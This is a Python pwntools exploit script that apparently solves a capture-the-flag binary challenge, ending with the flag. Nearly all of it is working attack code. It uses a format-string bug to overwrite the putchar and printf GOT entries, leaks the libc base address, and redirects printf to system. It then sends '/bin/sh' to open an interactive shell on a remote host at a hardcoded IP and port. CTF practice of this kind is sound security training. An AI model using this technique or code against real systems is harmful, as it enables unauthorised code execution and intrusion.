#!/usr/bin/env python3

from pwn import *

exe = './chall'
script = '''
b *0x40154A
b* 0x40160a
b* 0x40139d
set follow-fork-mode parent
c
'''
if args.LOCAL:
    p = process(exe)
elif args.GDB:
    p = process(exe)
    gdb.attach(p, gdbscript=script)
else:
    p = remote('103.245.250.31', 32183)
elf = ELF(exe)
libc = ELF('./libc-2.31.so')

main = 0x40146F
system = 0x404038
printf = 0x404040 
putchar = 0x404018
# binsh = 0x2f62 696e 2f73 6800

# overwrite putchar.got = main
payload = b'%5231c%12$hnaaaa' + p64(putchar)
p.sendlineafter(b'name?\n', payload)
p.recvuntil(b'Adele\n')
p.send(b'b')

# leak libc base
p.sendlineafter(b'name?\n', b'%p')
libc_base = int(p.recvline(), 16) - libc.sym._IO_2_1_stdin_ - 131
log.info('libc base leak ' + hex(libc_base))
p.recvuntil(b'Adele\n')
p.send(b'b')

# override printf.got = system
system = libc.sym.system + libc_base
system = (system & 0xffff00)>>8

payload = b'%' + str(system).encode() + b'c%12$hn'
payload += b'a'*(16-len(payload))
payload += p64(printf+1)

# system('/bin/sh')
print(payload)
p.sendlineafter(b'name?\n', payload)
p.recvuntil(b'Adele\n')
p.send(b'b')
p.sendline(b'/bin/sh\x00')

p.interactive()

# HCMUSCTF{0n3_g4dg3t_js_n0t_tk3_s0lutj0n_t0_4ll_pr0bl3ms}
